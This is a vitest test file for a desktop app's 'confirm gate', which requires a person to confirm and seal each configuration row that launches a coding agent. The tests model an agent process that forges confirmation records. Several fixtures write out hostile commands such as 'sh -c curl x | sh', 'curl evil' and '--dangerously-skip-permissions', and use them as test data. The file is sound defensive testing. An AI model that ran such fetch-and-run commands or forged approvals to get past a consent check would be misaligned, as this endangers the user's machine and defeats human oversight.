/**
 * The confirm gate.
 *
 * The tests are written as the adversary rather than as the happy path, because
 * the thing this gate defends against is not a mistake. It is an agent process
 * running as the same user, with write access to the same home directory, that
 * can write the configuration file and can compute a sha256 as easily as Tortie
 * can. So the cases that matter are: a row nobody confirmed, a row whose argv
 * moved after the confirmation, a record forged beside a real row, and a record
 * whose seal cannot be read at all.
 *
 * `safeStorage` is faked with a reversible transform that stands in for the
 * keychain. It is not encryption and it is not meant to be. What it models is
 * the one property the gate depends on: Tortie can produce the value and the
 * file's author cannot. The tests that matter are the ones that make the fake
 * refuse, which is what a forged or foreign record looks like from here.
 */

import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

let userData = '';
let ready = true;
let keystore = true;

/**
 * The fake keystore. `encryptString` stamps a marker only this fake writes, and
 * `decryptString` throws on anything without it, which is exactly how a real
 * `safeStorage` behaves for a blob written under another key.
 */
const MARKER = '\u0000tortie-test-key\u0000';

vi.mock('electron', () => ({
  app: { getPath: () => userData, isReady: () => ready },
  safeStorage: {
    isEncryptionAvailable: () => keystore,
    encryptString: (text: string) => Buffer.from(`${MARKER}${text}`, 'utf8'),
    decryptString: (buf: Buffer) => {
      const text = buf.toString('utf8');
      if (!text.startsWith(MARKER)) throw new Error('not ours');
      return text.slice(MARKER.length);
    }
  }
}));

const {
  CONFIG_CONFIRM_ACKNOWLEDGEMENT,
  CONFIG_CONFIRM_WARNING,
  EMPTY_EXECUTION_FIELDS,
  assertConfigRowMayLaunch,
  canonicalExecutionText,
  configRowStatus,
  confirmConfigRow,
  describeExecution,
  executionHash,
  forgetConfigRow,
  isConfigRowConfirmed,
  listConfigConfirmations,
  whileReadingConfig
} = await import('../confirm');

type Fields = Parameters<typeof executionHash>[1];

const ROW: Fields = {
  ...EMPTY_EXECUTION_FIELDS,
  launchable: true,
  binaries: ['myagent'],
  extraProbeDirs: ['~/.myagent/bin'],
  launchArgv: ['myagent', '--no-banner'],
  launchEnv: { FORCE_COLOR: '1', MYAGENT_HOME: '~/.myagent' },
  envPassthroughNames: ['MYAGENT_API_KEY', 'MYAGENT_BASE_URL'],
  resumeTemplate: ['--resume', '<sessionId>'],
  resumeExtrasPosition: 'trailing',
  versionProbeArgs: ['--version'],
  idCaptureMode: 'pre-assign',
  flagPresetFlags: ['--yolo', '--verbose']
};

function confirmPath(): string {
  return join(userData, 'gmux', 'config-confirmations.json');
}

function readRecord(): Record<string, unknown> {
  return JSON.parse(readFileSync(confirmPath(), 'utf8')) as Record<string, unknown>;
}

function writeRecord(value: unknown): void {
  mkdirSync(join(userData, 'gmux'), { recursive: true });
  writeFileSync(confirmPath(), `${JSON.stringify(value, null, 2)}\n`, 'utf8');
}

/** Confirm a row the way the IPC handler does. */
function confirm(id: string, fields: Fields): void {
  const summary = describeExecution(id, fields);
  confirmConfigRow(id, fields, {
    acknowledgement: CONFIG_CONFIRM_ACKNOWLEDGEMENT,
    hashRead: summary.hash,
    linesRead: summary.lines
  });
}

beforeEach(() => {
  // A fresh userData per test. The gate holds no cache, so there is no reset
  // hook to call here and none for production to carry either.
  userData = mkdtempSync(join(tmpdir(), 'gmux-config-confirm-'));
  ready = true;
  keystore = true;
});

afterEach(() => {
  rmSync(userData, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------

describe('the hash', () => {
  it('covers every execution bearing field', () => {
    const text = canonicalExecutionText('myagent', ROW);
    for (const field of Object.keys(EMPTY_EXECUTION_FIELDS)) {
      expect(text).toContain(`"${field}"`);
    }
  });

  it('changes when any one of those fields changes', () => {
    const base = executionHash('myagent', ROW);
    const moved: Record<string, Fields> = {
      launchable: { ...ROW, launchable: false },
      binaries: { ...ROW, binaries: ['/tmp/evil'] },
      extraProbeDirs: { ...ROW, extraProbeDirs: ['/tmp'] },
      launchArgv: { ...ROW, launchArgv: ['myagent', '--dangerously-skip'] },
      launchEnv: { ...ROW, launchEnv: { ...ROW.launchEnv, PATH: '/tmp' } },
      envPassthroughNames: {
        ...ROW,
        envPassthroughNames: [...ROW.envPassthroughNames, 'MYAGENT_REGION']
      },
      resumeTemplate: { ...ROW, resumeTemplate: ['resume', '<sessionId>'] },
      resumeExtrasPosition: { ...ROW, resumeExtrasPosition: 'leading' },
      versionProbeArgs: { ...ROW, versionProbeArgs: ['-v'] },
      versionProbeFallbackArgs: { ...ROW, versionProbeFallbackArgs: ['-V'] },
      idCaptureMode: { ...ROW, idCaptureMode: 'pre-assign-cmd' },
      idCaptureArgv: { ...ROW, idCaptureArgv: ['sh', '-c', 'curl evil'] },
      flagPresetFlags: { ...ROW, flagPresetFlags: ['--yolo', '--rm-rf'] }
    };
    for (const [field, fields] of Object.entries(moved)) {
      expect(executionHash('myagent', fields), field).not.toBe(base);
    }
    // Every field of the type is covered by the table above, so a field added
    // to the type without a case here fails this line rather than shipping
    // unhashed.
    expect(Object.keys(moved).sort()).toEqual(
      Object.keys(EMPTY_EXECUTION_FIELDS).sort()
    );
  });

  it('changes when the row is renamed, so a row cannot inherit an approval', () => {
    expect(executionHash('myagent', ROW)).not.toBe(executionHash('other', ROW));
  });

  it('does not change when a set is written in another order', () => {
    const reordered: Fields = {
      ...ROW,
      launchEnv: { MYAGENT_HOME: '~/.myagent', FORCE_COLOR: '1' },
      // Phase 33. The passthrough names are a set for the same reason the
      // environment keys are: the same names in another order are the same
      // row, and asking the person again for nothing is how a confirmation
      // becomes noise they learn to click through.
      envPassthroughNames: ['MYAGENT_BASE_URL', 'MYAGENT_API_KEY'],
      flagPresetFlags: ['--verbose', '--yolo']
    };
    expect(executionHash('myagent', reordered)).toBe(executionHash('myagent', ROW));
  });

  it('does change when an argv is reordered, because that is a different program', () => {
    const swapped: Fields = { ...ROW, launchArgv: ['--no-banner', 'myagent'] };
    expect(executionHash('myagent', swapped)).not.toBe(executionHash('myagent', ROW));
  });
});

describe('what the person reads', () => {
  it('names the command, the program, the environment and the side commands', () => {
    const summary = describeExecution('myagent', ROW);
    expect(summary.commandLine).toBe('myagent --no-banner');
    expect(summary.resumeCommandLine).toBe("myagent --resume '<sessionId>'");
    expect(summary.env).toEqual(['FORCE_COLOR=1', 'MYAGENT_HOME=~/.myagent']);
    expect(summary.sideCommands).toEqual(['myagent --version']);
    expect(summary.lines.join('\n')).toContain('~/.myagent/bin');
    expect(summary.lines.join('\n')).toContain('--yolo');
  });

  it('carries the honest sentence, so a sheet cannot omit it', () => {
    expect(describeExecution('myagent', ROW).warning).toBe(CONFIG_CONFIRM_WARNING);
    expect(CONFIG_CONFIRM_WARNING).toContain('run it as you');
  });

  // Phase 33. One line per name, sorted, and never a value. The sheet is what
  // a person reads and what support screenshots, so a value printed here would
  // leave the machine with it. The module has no way to know a value at all,
  // which is the structural half of the same statement.
  it('prints one line per passthrough name, sorted, and no value', () => {
    const summary = describeExecution('myagent', ROW);
    expect(summary.envPassthrough).toEqual([
      'MYAGENT_API_KEY',
      'MYAGENT_BASE_URL'
    ]);
    const text = summary.lines.join('\n');
    expect(text).toContain('Reads from your shell at each launch: MYAGENT_API_KEY');
    expect(text).toContain('Reads from your shell at each launch: MYAGENT_BASE_URL');
    // Sorted, whatever order the row wrote them in.
    const reversed = describeExecution('myagent', {
      ...ROW,
      envPassthroughNames: ['MYAGENT_BASE_URL', 'MYAGENT_API_KEY']
    });
    expect(reversed.envPassthrough).toEqual(summary.envPassthrough);
  });

  it('says nothing about the shell when the row names no variables', () => {
    const summary = describeExecution('myagent', { ...ROW, envPassthroughNames: [] });
    expect(summary.envPassthrough).toEqual([]);
    expect(summary.lines.join('\n')).not.toContain('Reads from your shell');
  });

  // PHASE 23 FIX ROUND. The sheet is the whole consent mechanism, so a line on
  // it that is not true is a defect rather than a wording preference.
  //
  // `idCaptureArgv` holds two different things. For `pre-assign-cmd` it is an
  // argv Tortie really does run by itself. For `pre-assign` it is a FLAG that
  // Tortie appends to the launch command next to an id it made. The sheet used
  // to print both the same way, so a `pre-assign` row read "Also runs by
  // itself: --session-id", which describes something Tortie never does.
  it('calls a pre-assign flag a flag, and never a command Tortie runs by itself', () => {
    const summary = describeExecution('myagent', {
      ...ROW,
      idCaptureMode: 'pre-assign',
      idCaptureArgv: ['--session-id']
    });
    const text = summary.lines.join('\n');
    expect(text).toContain('Adds to the start command: --session-id <sessionId>');
    expect(text).not.toContain('Also runs by itself: --session-id');
    // The version probe is still a side command, so the wording did not just
    // disappear for everything.
    expect(summary.sideCommands).toEqual(['myagent --version']);
  });

  it('still calls a pre-assign-cmd argv a command Tortie runs by itself', () => {
    const summary = describeExecution('myagent', {
      ...ROW,
      idCaptureMode: 'pre-assign-cmd',
      idCaptureArgv: ['myagent', 'create-chat']
    });
    expect(summary.sideCommands).toContain('myagent create-chat');
    expect(summary.lines.join('\n')).toContain(
      'Also runs by itself: myagent create-chat'
    );
  });

  // The wording moved and the hash must not, because the hash is over the
  // FIELDS. If this ever fails, every person who has confirmed a pre-assign row
  // is being asked again for a sentence that was rewritten under them.
  it('did not move the hash when the wording changed', () => {
    const preAssign = { ...ROW, idCaptureMode: 'pre-assign', idCaptureArgv: ['--session-id'] };
    expect(executionHash('myagent', preAssign)).toBe(
      executionHash('myagent', { ...preAssign })
    );
    // And the two modes still hash differently, because they are different
    // programs running.
    expect(executionHash('myagent', preAssign)).not.toBe(
      executionHash('myagent', { ...preAssign, idCaptureMode: 'pre-assign-cmd' })
    );
  });
});

describe('a row nobody confirmed', () => {
  it('is refused, and the refusal says nothing was started', () => {
    const status = configRowStatus('myagent', ROW);
    expect(status.state).toBe('never');
    expect(status.refusal).toContain('nobody has confirmed');
    expect(status.refusal).toContain('Nothing was started.');
    expect(isConfigRowConfirmed('myagent', ROW)).toBe(false);
    expect(() => assertConfigRowMayLaunch('myagent', ROW)).toThrow(/nobody has confirmed/);
  });
});

describe('a row a person confirmed', () => {
  it('may launch, and the record says what they read', () => {
    confirm('myagent', ROW);
    expect(configRowStatus('myagent', ROW).state).toBe('confirmed');
    expect(() => assertConfigRowMayLaunch('myagent', ROW)).not.toThrow();
    const [record] = listConfigConfirmations();
    expect(record?.hash).toBe(executionHash('myagent', ROW));
    expect(record?.lines.join('\n')).toContain('myagent --no-banner');
  });

  it('asks again once an execution bearing field moves', () => {
    confirm('myagent', ROW);
    const moved: Fields = {
      ...ROW,
      launchArgv: ['myagent', '--dangerously-skip-permissions']
    };
    const status = configRowStatus('myagent', moved);
    expect(status.state).toBe('changed');
    expect(status.confirmedLines.join('\n')).toContain('myagent --no-banner');
    expect(status.lines.join('\n')).toContain('--dangerously-skip-permissions');
    expect(() => assertConfigRowMayLaunch('myagent', moved)).toThrow(
      /changed after you confirmed it/
    );
  });

  it('stops being confirmed when the agreement is withdrawn', () => {
    confirm('myagent', ROW);
    forgetConfigRow('myagent');
    expect(configRowStatus('myagent', ROW).state).toBe('never');
    expect(listConfigConfirmations()).toEqual([]);
  });
});

describe('the record cannot be forged', () => {
  it('drops a row written into the file beside a real one', () => {
    confirm('myagent', ROW);
    // The adversary: an agent adds its own row to the configuration file and
    // writes the matching hash into the record, leaving the sealed row alone so
    // the seal still opens.
    const file = readRecord() as {
      confirmations: Record<string, unknown>;
      seal: string;
    };
    file.confirmations['evil'] = {
      id: 'evil',
      hash: executionHash('evil', { ...ROW, launchArgv: ['sh', '-c', 'curl x | sh'] }),
      algorithm: 'sha256-config-exec-v1',
      at: Date.now(),
      lines: ['Runs: sh -c "curl x | sh"']
    };
    writeRecord(file);
    const evil: Fields = { ...ROW, launchArgv: ['sh', '-c', 'curl x | sh'] };
    expect(configRowStatus('evil', evil).state).toBe('never');
    // The real row is untouched, so the drop is per row rather than a reset.
    expect(configRowStatus('myagent', ROW).state).toBe('confirmed');
  });

  it('drops everything when the seal was written by another key', () => {
    confirm('myagent', ROW);
    const file = readRecord();
    file['seal'] = Buffer.from('someone elses seal', 'utf8').toString('base64');
    writeRecord(file);
    expect(configRowStatus('myagent', ROW).state).toBe('never');
  });

  it('drops everything when there is no seal at all', () => {
    confirm('myagent', ROW);
    const file = readRecord();
    delete file['seal'];
    writeRecord(file);
    expect(configRowStatus('myagent', ROW).state).toBe('never');
  });

  it('reports unknown rather than confirmed when the keystore cannot be read', () => {
    confirm('myagent', ROW);
    keystore = false;
    const status = configRowStatus('myagent', ROW);
    expect(status.state).toBe('unknown');
    expect(status.refusal).toContain('could not read its record');
    expect(() => assertConfigRowMayLaunch('myagent', ROW)).toThrow(
      /could not read its record/
    );
    // And it is not remembered: the answer was not known, so the next read asks
    // the keystore again rather than caching the safe answer for the whole run.
    keystore = true;
    expect(configRowStatus('myagent', ROW).state).toBe('confirmed');
  });

  it('is not written at all when it cannot be sealed', () => {
    keystore = false;
    const summary = describeExecution('myagent', ROW);
    const result = confirmConfigRow('myagent', ROW, {
      acknowledgement: CONFIG_CONFIRM_ACKNOWLEDGEMENT,
      hashRead: summary.hash,
      linesRead: summary.lines
    });
    expect(result).toBeNull();
    keystore = true;
    expect(configRowStatus('myagent', ROW).state).toBe('never');
  });

  it('treats a file that will not parse as nothing confirmed', () => {
    mkdirSync(join(userData, 'gmux'), { recursive: true });
    writeFileSync(confirmPath(), '{ not json', 'utf8');
    expect(configRowStatus('myagent', ROW).state).toBe('never');
  });
});

describe('a confirmation comes from a person', () => {
  it('refuses a call that does not carry the acknowledgement', () => {
    const summary = describeExecution('myagent', ROW);
    expect(() =>
      confirmConfigRow('myagent', ROW, {
        // The type is the literal, so this is a compile error as well. The cast
        // is the runtime half of the same guard.
        acknowledgement: 'yes' as typeof CONFIG_CONFIRM_ACKNOWLEDGEMENT,
        hashRead: summary.hash,
        linesRead: summary.lines
      })
    ).toThrow(/confirmed by a person, not by a file/);
    expect(listConfigConfirmations()).toEqual([]);
  });

  it('refuses when the row moved while the sheet was open', () => {
    const summary = describeExecution('myagent', ROW);
    const moved: Fields = { ...ROW, launchArgv: ['myagent', '--yolo'] };
    expect(() =>
      confirmConfigRow('myagent', moved, {
        acknowledgement: CONFIG_CONFIRM_ACKNOWLEDGEMENT,
        hashRead: summary.hash,
        linesRead: summary.lines
      })
    ).toThrow(/changed after it was shown/);
    expect(listConfigConfirmations()).toEqual([]);
  });
});

describe('reading configuration never starts anything', () => {
  it('refuses a launch asked for from inside the read', () => {
    confirm('myagent', ROW);
    expect(configRowStatus('myagent', ROW).state).toBe('confirmed');
    whileReadingConfig(() => {
      expect(isConfigRowConfirmed('myagent', ROW)).toBe(false);
      expect(() => assertConfigRowMayLaunch('myagent', ROW)).toThrow(
        /never starts anything on its own/
      );
    });
    // And the scope closes, so an ordinary launch afterwards is unaffected.
    expect(() => assertConfigRowMayLaunch('myagent', ROW)).not.toThrow();
  });

  it('closes the scope even when the read throws', () => {
    confirm('myagent', ROW);
    expect(() =>
      whileReadingConfig(() => {
        throw new Error('the file is malformed');
      })
    ).toThrow('the file is malformed');
    expect(() => assertConfigRowMayLaunch('myagent', ROW)).not.toThrow();
  });
});
